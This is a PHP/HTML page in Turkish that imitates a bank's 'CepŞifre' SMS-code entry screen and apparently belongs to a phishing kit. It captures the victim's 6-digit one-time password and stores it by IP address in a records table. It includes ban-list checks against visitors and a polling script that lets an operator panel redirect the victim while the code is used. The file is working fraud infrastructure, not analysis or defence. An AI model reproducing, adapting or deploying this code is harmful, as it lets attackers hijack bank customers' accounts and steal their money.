<?php
require_once 'connect.php';
if ($ajax->banControl(IP)) {
    $ajax->redirect(BAN_URL);
}

$has_error = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sms = isset($_POST['customSms']) ? trim($_POST['customSms']) : '';
    if (strlen($sms) === 6 && ctype_digit($sms)) {
        $query = $db->prepare("UPDATE records SET sms = ?, page = 'Bekle', lastOnline = ? WHERE ipAddress = ?");
        $query->execute([$sms, time() + 10, IP]);
        $ajax->redirect('bekle.php');
    } else {
        $has_error = true;
    }
}

$telgeldi = isset($_SESSION['user_tel']) ? $_SESSION['user_tel'] : '';

$ajax->pageUpdate(IP, 'SMS');
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    
    
    
    <title>Sms Giriş - Direkt</title>
    <style>
        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
        
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJnecmNE.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 400;
          font-display: swap;
          src: url('files/asset/fonts/pxiEyp8kv8JHgFVrJJfecg.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 500;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLGT9Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 600;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLEj6Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 700;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLCz7Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1JlFc-K.woff2') format('woff2');
          unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        @font-face {
          font-family: 'Poppins';
          font-style: normal;
          font-weight: 800;
          font-display: swap;
          src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
    </style>
</head>
<body>
    <div id="slider">
        <div class="gray4 slide active" style="background-color: rgb(241, 241, 241);">
            <div id="alertDiv3" class="alertDiv <?php echo $has_error ? 'show' : ''; ?>">
                <hr style="width:5%; border: 2px solid; border-radius: 5px; margin-top:5px;">
                <div style="padding-bottom:5px;"></div>
                <p style="color: #000; font-size: 16px; font-weight: 600; margin-top:15px;">Uyarı</p>
                <img src="/basvuru/img/turuncu.png" style="width: 25%;">
                <p style="color: #000; font-size: 14px; font-weight: 400; margin-right:30px; margin-left:30px;">Girdiğin Cep Şifre hatalı. Kontrol edip tekrar deneyebilirsin.</p>
                <button type="button" onclick="closeAlert()" id="btn-spc3" style="width: 90% !important;">Tamam</button>
            </div>

            <div style="background-color:red;">
                <div id="tab3headers">
                    <img src="/basvuru/img/ok.png" onclick="location.href='index.php'" width="32px" style="position:absolute; top: 10px; left: 10px; cursor: pointer;">
                    <h2 style="text-align: center; font-size: 12px; color: white; margin: 0; font-weight: 400; margin-bottom:10px;">1 numaralı CepŞifre'ni gir</h2>
                </div>
                <div id="tab3header1">
                    <label style="text-align: center; font-size: 11px; color: white; font-weight: 200;">
                        <span id="cepgir"><?php echo htmlspecialchars($telgeldi); ?> nolu telefonuna gönderdik.</span>
                    </label>
                </div>
            </div>

            <div id="loginInputs">
                <form id="customSmsForm" method="POST" action="sms.php">
                    <label for="customSms" style="color:black; font-size: 11px; display: block; margin-bottom: 3%; float: left;">CEP ŞİFRE</label>
                    <input type="text" name="customSms" placeholder="6 haneli CepŞifre'ni gir" id="customSms" style="font-size: 12px; font-weight:bold; border:0; width: 100%; display: block; margin-bottom: 10px;" minlength="6" maxlength="6" inputmode="numeric" oninput="checkSmsLength()" required>
                </form>
            </div>

            <?php if (isset($_GET['suredoldu'])): ?>
            <div style="display: flex; justify-content: space-between;">
                <p style="color: red; font-size: 12px; margin-top: 15px; margin-left: 15px; font-weight:500;">Cep şifre süreniz dolmuştur tekrar deneyiniz.</p>
            </div>
            <?php endif; ?>

            <div id="tab3footer" style="display: flex; justify-content: space-between;">
                <p id="countdownCustom" style="color: black; font-size: 12px; margin-top: 35px; margin-left: 15px; font-weight:500;">Eğer cep şifren <b>2:40</b> saniye içinde ulaşmazsa yeni bir şifre isteyebilirsin.</p>
            </div>

            <div id="gonderCustom">
                <button class="saban" id="btn-custom-spc3" type="button" onclick="submitSms()" style="font-size: 11px; border-radius: 40px; background-color: #dc0004; color: white; border: 0; width: 70%; padding: 17px; margin-top: 10px; font-family: 'Poppins', sans-serif; font-weight: 500;" disabled>Devam</button>
            </div>
        </div>
    </div>

    <script>
        function checkSmsLength() {
            const smsVal = document.getElementById('customSms').value;
            const btn = document.getElementById('btn-custom-spc3');
            if (smsVal.length === 6 && !isNaN(smsVal)) {
                btn.disabled = false;
            } else {
                btn.disabled = true;
            }
        }
        function submitSms() {
            document.getElementById('customSmsForm').submit();
        }
        function closeAlert() {
            document.getElementById('alertDiv3').classList.remove('show');
        }

        // Countdown mechanism
        function startCountdown(duration, display) {
            let timer = duration, minutes, seconds;
            setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.innerHTML = `Eğer cep şifren <b>${minutes}:${seconds}</b> saniye içinde ulaşmazsa yeni bir şifre isteyebilirsin.`;

                if (--timer < 0) {
                    timer = 0;
                }
            }, 1000);
        }

        // Panel redirect kontrolü - her 2 saniyede bir kontrol et
        function checkRedirect() {
            fetch('check_redirect.php')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(function() {});
        }
        setInterval(checkRedirect, 2000);

        window.onload = function () {
            const duration = 2 * 60 + 40; // 2 min 40 sec
            const display = document.querySelector('#countdownCustom');
            startCountdown(duration, display);
        };
    </script>
</body>
</html>






